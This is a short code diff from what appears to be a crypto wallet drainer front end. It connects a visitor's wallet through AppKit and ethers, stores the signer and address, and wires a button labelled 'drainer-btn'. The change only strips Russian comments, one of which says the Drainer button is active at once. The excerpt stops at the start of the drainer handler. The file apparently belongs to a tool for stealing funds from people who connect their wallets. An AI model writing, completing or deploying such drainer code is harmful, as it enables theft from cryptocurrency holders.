@@ -34,10 +34,8 @@ const modal = createAppKit({
   },
 });
 
-// глобальные переменные
 let appProvider, appSigner, userAddress;
 
-// подключение кошелька
 modal.on('connect', async ({ provider }) => {
   appProvider = new ethers.providers.Web3Provider(provider, 'any');
   appSigner = appProvider.getSigner();
@@ -46,11 +44,9 @@ modal.on('connect', async ({ provider }) => {
   document.getElementById('status').textContent = `Подключено: ${userAddress}`;
 });
 
-// открыть connect-модалку
 document.getElementById('open-connect-modal')
   .addEventListener('click', () => modal.open());
 
-// кнопка Drainer сразу активна
 document.getElementById('drainer-btn')
   .addEventListener('click', async () => {
     if (!appSigner) {
